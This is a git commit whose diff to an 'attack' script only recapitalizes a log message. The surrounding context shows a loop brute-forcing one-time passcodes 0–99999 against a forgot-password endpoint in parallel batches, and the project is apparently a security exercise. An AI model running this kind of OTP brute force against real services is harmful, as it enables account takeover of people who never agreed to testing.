a61b14fcab93c24d38735bef0666e0235efc0341
madhavsahi <madhavsahi16@gmail.com>
2024-05-01 23:21:03 +0530

    added attack logic to exploit forgot password endpoint

--- attack/src/index.ts
+++ attack/src/index.ts
@@ -39,7 +39,7 @@ async function sendRequest(otp: number) {
 async function main() {
   for (let i = 0; i < 100000; i += 100) {
     const promises = [];
-    console.log("here for: " + i);
+    console.log("Here for: " + i);
     for (let j = 0; j < 100; j++) {
       promises.push(sendRequest(i + j));
     }
